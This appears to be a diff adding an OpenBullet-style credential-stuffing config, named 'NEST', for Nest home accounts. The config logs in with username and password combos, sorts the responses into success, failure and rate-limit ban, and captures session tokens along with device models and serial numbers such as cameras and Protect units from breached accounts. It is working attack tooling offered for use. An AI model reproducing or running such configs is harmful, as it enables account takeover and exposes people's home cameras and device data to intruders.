@@ -1,0 +1,60 @@
+[SETTINGS]
+{
+  "Name": "NEST",
+  "SuggestedBots": 1,
+  "LastModified": "2018-09-30T19:31:16.9604488+00:00",
+  "AdditionalInfo": "",
+  "Author": "v0ilawes",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#post REQUEST POST "https://home.nest.com/session" AutoRedirect=TRUE 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://home.nest.com/" 
+#cztoken PARSE "<COOKIES(cztoken)>" LR "" "" Recursive=FALSE -> VAR "cztoken" "" "" 
+#userid PARSE "<SOURCE>" LR "userid\":\"" "\"" Recursive=FALSE -> VAR "userid" "" "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+  KEYCHAIN Failure OR 
+    KEY "invalid user credentials" 
+  KEYCHAIN Ban OR 
+    KEY "Too many requests" 
+REQUEST POST "https://home.nest.com/api/0.1/user/<userid>/app_launch" AutoRedirect=TRUE 
+  CONTENT "{\"known_bucket_types\":[\"buckets\",\"delayed_topaz\",\"demand_charge\",\"demand_charge_event\",\"demand_response\",\"device\",\"device_alert_dialog\",\"geofence_info\",\"link\",\"message\",\"message_center\",\"metadata\",\"occupancy\",\"quartz\",\"safety\",\"rate_plan\",\"rcs_settings\",\"safety_summary\",\"schedule\",\"shared\",\"structure\",\"structure_history\",\"structure_metadata\",\"topaz\",\"topaz_resource\",\"tou\",\"track\",\"trip\",\"tuneups\",\"user\",\"user_alert_dialog\",\"user_settings\",\"utility\",\"where\",\"widget_track\",\"kryptonite\"],\"known_bucket_versions\":[]}" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "authorization: Basic <cztoken>" 
+  HEADER "Host: home.nest.com" 
+  HEADER "hostname: home.nest.com" 
+  HEADER "Referer: https://home.nest.com/" 
+#devices PARSE "<SOURCE>" LR "model\":\"" "\"" Recursive=TRUE -> CAP "Devices" "" "" 
+#SN PARSE "<SOURCE>" LR "serial_number\":\"" "\"" Recursive=TRUE -> CAP "SN" "" "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "Cam" 
+    KEY "Hello" 
+    KEY "CAM" 
+    KEY "protect" 
+    KEY "IQ" 
